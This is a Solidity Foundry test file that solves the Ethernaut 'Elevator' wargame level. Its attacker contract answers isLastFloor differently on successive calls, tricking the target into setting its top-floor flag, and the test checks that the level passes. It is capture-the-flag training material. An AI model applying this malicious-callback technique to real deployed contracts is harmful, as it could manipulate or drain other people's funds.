pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { Elevator } from "src/Elevator/Elevator.sol";
import { ElevatorFactory } from "src/Elevator/ElevatorFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";

contract ElevatorExploit {
    address victim;
    bool isCalled;

    constructor(address _victim) {
        victim = _victim;
    }

    function attack() external {
        (bool success,) = victim.call(abi.encodeWithSignature("goTo(uint256)", 1));
        require(success, "Attack failed");
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (isCalled) {
            return true;
        }
        isCalled = true;
        return false;
    }
}

contract ElevatorTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");

    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testElevatorHack() external {
        // level setup
        ElevatorFactory factory = new ElevatorFactory();
        ethernaut.registerLevel(factory);

        vm.startPrank(me);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Elevator elevator = Elevator(payable(levelAddress));

        // attack
        ElevatorExploit exploit = new ElevatorExploit(address(elevator));
        exploit.attack();

        // submission
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}
